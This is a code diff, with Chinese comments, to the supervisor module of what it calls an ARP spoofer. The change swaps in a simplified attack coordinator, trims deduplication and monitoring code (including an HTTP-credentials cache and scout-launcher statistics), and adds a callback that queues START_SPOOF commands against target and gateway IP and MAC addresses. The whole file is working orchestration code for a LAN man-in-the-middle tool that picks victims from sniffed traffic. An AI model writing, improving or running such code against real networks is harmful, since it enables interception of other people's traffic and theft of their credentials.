@@ -21,14 +21,14 @@ import sys
 import hashlib  # ★【新增】★ 用于计算数据包指纹
 import queue     # ★【新增】★ 用于批量命令处理
 import platform  # ★【新增】★ 用于平台检测
-from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor  # ★【修复】★ 混合使用线程池和进程池
+from concurrent.futures import ThreadPoolExecutor  # ★【简化】★ 只使用线程池
 from dataclasses import dataclass
 from typing import Optional, Dict, Set
 from datetime import datetime, timedelta
 
 from state_cache import StateCache
 from packet_analyzer import PacketAnalyzer
-from attack_coordinator import AttackCoordinator
+from attack_coordinator import UltraSimpleAttackCoordinator  # ★【修改】★ 使用极简版
 from web_api import WebAPI
 from config import Config
 
@@ -75,7 +75,7 @@ class PythonSupervisor:
         # 核心组件
         self.state_cache = StateCache()
         self.packet_analyzer = PacketAnalyzer(config)
-        self.attack_coordinator = AttackCoordinator(config, self.state_cache)
+        self.attack_coordinator = UltraSimpleAttackCoordinator(config, self._attack_callback)  # ★【修改】★ 使用极简版协调器
         self.web_api = WebAPI(self.state_cache, config)
         
         # ★【新增】★ 心跳机制
@@ -83,15 +83,10 @@ class PythonSupervisor:
         self.heartbeat_thread = None
         self.heartbeat_running = False
         
-        # ★【关键修复】★ 主业务用线程池(解析数据包等IO密集)，CPU密集任务用进程池避免GIL
+        # ★【简化】★ 只使用线程池，香橙派3B资源有限
         self.thread_pool = ThreadPoolExecutor(
-            max_workers=max_threads // 2,  # 减半线程数为进程池让路
+            max_workers=max_threads,  # 使用全部线程数
             thread_name_prefix="PacketWorker"
-        )
-        
-        # ★【关键修复】★ CPU密集型任务专用进程池，避免GIL饥饿导致心跳卡死
-        self.cpu_process_pool = ProcessPoolExecutor(
-            max_workers=max(1, max_threads // 4),  # 少量进程用于CPU密集计算
         )
         
         # ★【增强】★ 统计信息，添加更多监控指标
@@ -110,15 +105,10 @@ class PythonSupervisor:
         }
         self.stats_lock = threading.RLock()  # ★【优化】★ 使用可重入锁
         
-        # ★★★【优化】★★★ 入口去重缓存，减少内存占用
-        # 简化缓存实现，避免外部依赖
-        self.recent_packets_cache = {}
-        self.cache_lock = threading.Lock()  # 用于保护缓存的线程安全
-        
-        # ★【优化】★ HTTP凭据级别的去重缓存，减少大小
-        self.http_credentials_cache = {}
-        self.http_cache_lock = threading.Lock()
-        self.http_cache_ttl = 8  # 8秒TTL
+        # ★【极简化】★ 移除复杂缓存机制
+        self.recent_packets = set()  # 简单的去重集合
+        self.cache_lock = threading.Lock()
+        self.last_cache_cleanup = time.time()
         
     def _setup_logging(self):
         """设置日志系统"""
@@ -255,59 +245,49 @@ class PythonSupervisor:
             self.shutdown()
             
     def _process_packet_with_dedup(self, raw_data: bytes):
-        """处理数据包并进行去重 - 在工作线程中执行的优化版本"""
+        """处理数据包并进行去重 - 极简版本"""
         try:
             # 1. 将原始二进制数据转换为字符串
             packet_data = raw_data.decode('utf-8')
             
-            # 2. ★【关键优化】★ 快速哈希去重，避免重复处理
-            packet_hash = hashlib.md5(packet_data.encode()).hexdigest()
+            # 2. ★【极简去重】★ 只保留最近30秒的数据包哈希
+            packet_hash = hashlib.md5(packet_data.encode()).hexdigest()[:16]  # 只取前16位节省内存
             
             with self.cache_lock:
                 current_time = time.time()
                 
-                # 清理过期缓存
-                expired_keys = [k for k, (_, timestamp) in self.recent_packets_cache.items() 
-                              if current_time - timestamp > self.cache_ttl]
-                for key in expired_keys:
-                    del self.recent_packets_cache[key]
+                # 每10秒清理一次缓存
+                if current_time - self.last_cache_cleanup > 10:
+                    self.recent_packets.clear()
+                    self.last_cache_cleanup = current_time
                 
-                if packet_hash in self.recent_packets_cache:
+                if packet_hash in self.recent_packets:
                     self._safe_stats_increment('packets_dropped')
                     return  # 重复数据包，直接丢弃
                 
-                # 添加到去重缓存
-                self.recent_packets_cache[packet_hash] = (True, current_time)
+                self.recent_packets.add(packet_hash)
             
             # 3. 执行实际的数据包处理
             self._process_packet(packet_data)
             
         except UnicodeDecodeError:
-            # 二进制数据解码失败
             self._safe_stats_increment('packets_dropped')
-            self.logger.debug("数据包解码失败")
         except Exception as e:
             self._safe_stats_increment('packets_dropped')
             self.logger.error(f"数据包处理错误: {e}")
     
     def _process_packet(self, packet_data: str):
-        """处理单个数据包"""
+        """简化的数据包处理流程"""
         try:
             # 解析数据包
             packet_info = json.loads(packet_data)
             self._safe_stats_increment('packets_processed')
             
-            # ★★★【关键修复】★★★ 首先通过 AdaptiveFlowController 进行流量控制
-            if not self.attack_coordinator.adaptive_flow_controller.should_process_packet():
-                self._safe_stats_increment('packets_dropped')
-                self.logger.info("🚫 数据包被自适应流控器丢弃 (速率限制)")
-                return
-            
             # 分析数据包
             analysis_result = self.packet_analyzer.analyze(packet_info)
             
             if analysis_result:
-                # ★★★【关键修复】★★★ 所有事件都通过统一的决策流程，确保流控生效
+                # ★【简化】★ 直接调用决策，攻击协调器内部已包含所有必要的控制
                 decision = self.attack_coordinator.make_decision(analysis_result)
                 if decision:
                     self._execute_decision(decision)
@@ -455,7 +435,7 @@ class PythonSupervisor:
                         
                         self.stats['processing_rate'] = packet_rate
                         
-                        # 输出性能报告
+                        # ★【简化】★ 基本性能报告
                         uptime = current_time - self.stats['start_time']
                         self.logger.info(f"📊 性能报告:")
                         self.logger.info(f"  运行时间: {uptime:.1f}秒")
@@ -465,56 +445,12 @@ class PythonSupervisor:
                         self.logger.info(f"  丢包: {self.stats['packets_dropped']}")
                         self.logger.info(f"  心跳: 发送={self.stats['heartbeat_sent']}, 接收={self.stats['heartbeat_received']}")
                         
-                        # ★【新增】★ Scout发射器状态
-                        if hasattr(self.attack_coordinator, 'scout_launcher'):
-                            launcher = self.attack_coordinator.scout_launcher
-                            with launcher.lock:
-                                active_count = len(launcher.active_scouts)
-                                queue_count = len(launcher.launch_queue)
-                            self.logger.info(f"  🚀 Scout状态: 活跃 {active_count}/{launcher.max_concurrent}, 排队 {queue_count}")
-                        
-                        # ★【增强】★ 显示Scout和Attack会话统计
-                        if hasattr(self.attack_coordinator, 'get_session_stats'):
-                            session_stats = self.attack_coordinator.get_session_stats()
-                            self.logger.info(f"  会话: Scout {session_stats['active_scouts']}/{session_stats['max_scout_attacks']}, Attack {session_stats['active_attacks']}/{session_stats['max_active_attacks']}")
-                        
-                        # ★【增强】★ 并发控制状态
-                        if hasattr(self.attack_coordinator, 'get_concurrency_stats'):
-                            concurrency_stats = self.attack_coordinator.get_concurrency_stats()
-                            self.logger.info(f"  🎫 令牌: {concurrency_stats['tokens_available']}/{concurrency_stats['max_tokens']}, 延迟: {concurrency_stats['delayed_attacks']}")
-                        
-                        # ★【新增】★ 显示并发状态监控
-                        if hasattr(self.attack_coordinator, 'get_concurrency_stats'):
-                            concurrency_stats = self.attack_coordinator.get_concurrency_stats()
-                            self.logger.info(f"  并发状态: 处理凭据 {concurrency_stats.get('processing_credentials', 0)}, 恢复目标 {concurrency_stats.get('restoring_targets', 0)}")
-                        
-                        # 更新统计
-                        last_packets = current_packets
-                        last_commands = current_commands
-                        last_stats_time = current_time
-                        
-                        # ★【优化】★ 调整警告阈值，适应不同平台
+                        # ★【简化】★ 基本警告检查
                         queue_threshold = 300 if self.is_arm_platform else 500
-                        packet_threshold = 150 if self.is_arm_platform else 300
-                        
                         if self.command_queue.qsize() > queue_threshold:
                             self.logger.warning("⚠️  检测到命令队列深度过高!")
-                        if packet_rate > packet_threshold:
+                        if packet_rate > 200:
                             self.logger.warning("⚠️  数据包处理速率过高!")
-                        
-                        # ★【新增】★ Scout启动速率监控
-                        if hasattr(self.attack_coordinator, 'scout_launcher'):
-                            launcher = self.attack_coordinator.scout_launcher
-                            with launcher.lock:
-                                active_count = len(launcher.active_scouts)
-                            if active_count > launcher.max_concurrent * 0.8:  # 80%使用率警告
-                                self.logger.warning(f"⚠️  Scout使用率过高: {active_count}/{launcher.max_concurrent}")
-                        
-                        # ★【新增】★ 延迟队列监控
-                        if hasattr(self.attack_coordinator, 'delayed_attacks'):
-                            delayed_count = len(self.attack_coordinator.delayed_attacks)
-                            if delayed_count > 20:
-                                self.logger.warning(f"⚠️  延迟攻击队列过高: {delayed_count}")
                 
                 time.sleep(5)  # 每5秒检查一次
                 
@@ -625,7 +561,6 @@ class PythonSupervisor:
         
         # 关闭线程池
         self.thread_pool.shutdown(wait=True)
-        self.cpu_process_pool.shutdown(wait=True)  # ★【新增】★ 关闭进程池
         
         # ★【新增】★ 清理独立心跳上下文
         if hasattr(self, 'heartbeat_context'):
@@ -870,6 +805,25 @@ class PythonSupervisor:
         except Exception as e:
             self.logger.warning(f"设置统计键 '{key}' 时出错: {e}")
     
+    def _attack_callback(self, decision):
+        """极简协调器的攻击回调函数"""
+        try:
+            command = {
+                "type": "START_SPOOF",
+                "target_ip": decision.target_ip,
+                "gateway_ip": decision.gateway_ip or "192.168.1.1",
+                "target_mac": decision.target_mac or "",
+                "gateway_mac": decision.gateway_mac or "",
+                "duration": decision.duration or 45,
+                "attack_type": decision.attack_type or "standard"
+            }
+            
+            # 使用队列发送命令
+            self._queue_command(command)
+            
+        except Exception as e:
+            self.logger.error(f"攻击回调错误: {e}")
+
 def parse_arguments():
     """解析命令行参数"""
     parser = argparse.ArgumentParser(description="ARP欺骗器Python监督者")
